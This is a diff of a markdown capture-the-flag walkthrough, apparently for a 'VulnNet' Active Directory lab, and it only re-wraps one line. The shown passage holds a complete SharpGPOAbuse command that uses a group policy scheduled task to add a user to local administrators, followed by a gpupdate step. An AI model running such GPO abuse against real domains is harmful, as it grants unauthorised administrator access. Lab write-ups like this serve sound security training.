@@ -83,7 +83,8 @@ I collect domain info with bloodhound-python and upload it to the bloodhound for
 Here is the shortest path to the admin where we will be abusing one of the `GPO(group policy object)` on which we can edit users' permission, local groups, memberships, and computer tasks.
 We use `SharpGPOAbuse.exe` to escalate our privilege.
 
-`.\SharpGPOAbuse.Exe AddComputerTask TaskName "babbadeckl_privesc" Author vulnnet\administrator Command "cmd.exe" Arguments "/c net localgroup administrators enterprise-security /add" GPOName "SECURITY-POL-VN"`
+`.\SharpGPOAbuse.Exe AddComputerTask TaskName "babbadeckl_privesc" 
+Author vulnnet\administrator Command "cmd.exe" Arguments "/c net localgroup administrators enterprise-security /add" GPOName "SECURITY-POL-VN"`
 
 `gpupdate \force`
 
